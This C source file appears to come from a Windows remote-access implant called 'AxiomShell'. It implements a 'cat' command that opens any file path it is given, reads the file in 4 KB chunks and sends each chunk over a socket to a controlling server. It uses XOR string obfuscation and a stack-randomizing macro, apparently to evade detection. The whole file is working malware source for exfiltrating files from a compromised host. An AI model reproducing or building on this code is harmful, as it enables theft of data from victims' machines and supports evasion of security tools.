#include "AxiomShell.h"
#include "autoxor.h"

BOOL BUILTIN_cat(SOCKET sock, size_t argc, char **argv)
{
	STACK_RANDOMIZER;
	HANDLE hFile;
	CHAR buffer[4096];
	SIZE_T read_count;
	DWORD read_count_tmp;
	JSON_RAW_BINARY_ARGS jsonArgs;
	DWORD filesizeHigh;
	DWORD filesizeLow;
	LARGE_INTEGER filesize;

	if (argc !=1)
	{
		JSON_send_packets(JsonCommandOutput, sock, (void *)XorStr("[!] Usage: cat {PATH}\n"));
		return (FALSE);
	}

	// First try to open a read HANDLE to the file
	hFile = CreateFileA(
		argv[0],
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
	);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		JSON_send_packets(JsonCommandOutput, sock, (void *)XorStr("[!] File not found or permission denied\n"));
		return (FALSE);
	}

	// If successful, extract its size
	filesizeLow = GetFileSize(hFile, &filesizeHigh);
	if (filesizeLow == INVALID_FILE_SIZE)
	{
		JSON_send_packets(JsonCommandOutput, sock, (void*)XorStr("[!] Failed to get the file size, aborting\n"));
		CloseHandle(hFile);
		return (FALSE);
	}
	filesize.LowPart = filesizeLow;
	filesize.HighPart = filesizeHigh;

	// Now read the file chunk-by-chunk and send each one to the server, as CommandOutput
	read_count = 0;
	while (read_count < (SIZE_T)filesize.QuadPart)
	{
		memset(buffer, 0, sizeof(buffer));
		ReadFile(
			hFile,
			buffer,
			sizeof(buffer),
			&read_count_tmp,
			NULL
		);
		jsonArgs.buffer = buffer;
		jsonArgs.bufferlen = read_count_tmp;
		JSON_send_packets(JsonRawBinary, sock, (void*)&jsonArgs);
		read_count += read_count_tmp;
	}

	// All done, close and return
	CloseHandle(hFile);
	return (TRUE);
}

